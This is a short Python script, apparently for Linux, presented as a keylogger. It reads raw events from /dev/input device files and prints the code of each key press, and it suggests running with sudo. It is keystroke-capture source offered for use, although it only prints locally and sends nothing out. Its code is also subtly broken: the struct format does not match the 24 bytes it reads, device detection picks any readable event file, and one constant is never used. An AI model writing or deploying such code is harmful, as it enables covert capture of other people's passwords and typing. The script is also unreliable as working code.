import struct
import os

DEVICE_PATH = "/dev/input/event3"  # Change this to your keyboard event file

def find_keyboard():
    """Automatically find a keyboard device."""
    for device in os.listdir("/dev/input"):
        if device.startswith("event"):
            path = f"/dev/input/{device}"
            try:
                with open(path, "rb") as f:
                    # Check if the device is readable
                    return path
            except PermissionError:
                continue
    return None

def keylogger():
    device = find_keyboard()
    if not device:
        print("No keyboard found or permission denied. Try running with sudo.")
        return

    print(f"Using keyboard at {device}")
    
    with open(device, "rb") as f:
        while True:
            event = f.read(24)  # Read 24 bytes (event structure)
            (_, _, _, event_type, code, value) = struct.unpack("llHHHi", event)

            if event_type == 1 and value == 1:  # Key press event
                print(f"Key Code: {code}")

if __name__ == "__main__":
    keylogger()